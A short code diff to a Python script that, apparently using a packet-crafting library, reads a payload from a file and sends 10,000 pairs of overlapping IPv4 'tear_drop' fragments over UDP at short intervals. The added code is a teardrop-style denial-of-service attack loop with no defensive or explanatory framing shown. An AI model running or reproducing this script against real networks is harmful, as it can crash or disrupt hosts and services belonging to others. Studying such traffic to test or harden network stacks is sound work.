@@ -11,8 +11,18 @@ Desc:
 ---------------------- End -----------------------
 """
 
-from crafting_packets.ipv4_exception_packet import *
+from crafting_packets.ipv4_exception_packets import *
+from crafting_packets.send_exception_packets import send_packets
+import time
 
 
 if __name__ == '__main__':
-    pass
+    with open("data.txt", "r") as f:
+        data = f.read()
+        # print(data)
+    for i in range(0, 10000):
+        pkt = tear_drop(1, 0, 17, data=data)
+        send_packets(pkt)
+        pkt = tear_drop(1, 176, 17, data=data)
+        send_packets(pkt)
+        time.sleep(0.05)
